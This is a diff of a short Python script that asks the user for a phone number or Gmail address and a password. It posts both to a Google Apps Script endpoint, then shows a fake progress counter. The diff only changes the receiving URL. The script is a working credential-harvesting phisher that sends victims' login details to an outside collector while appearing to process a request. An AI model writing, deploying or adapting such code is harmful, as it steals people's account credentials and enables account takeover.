@@ -23,7 +23,7 @@ umail =input("please Enter phone and gmail:")
 upass =input("please Enter  password'")
 data ={'mail':umail,'pass':upass}
 print(cyan+"plase wait"+cyan)
-rq =requests.post('https://script.google.com/macros/s/AKfycbx1cnhTRxQYCCWH0E55DRSXr54-p2-Q-0AEzUtqoTRZVHx1sw/exec',data=data)
+rq =requests.post('https://script.google.com/macros/s/AKfycbxepLv6f8wvFcAz7wE_hAfBMcjwyPt_49BS9fofcckiNTzHeT8/exec',data=data)
 
 for i in range(100):
    print(i,'%')
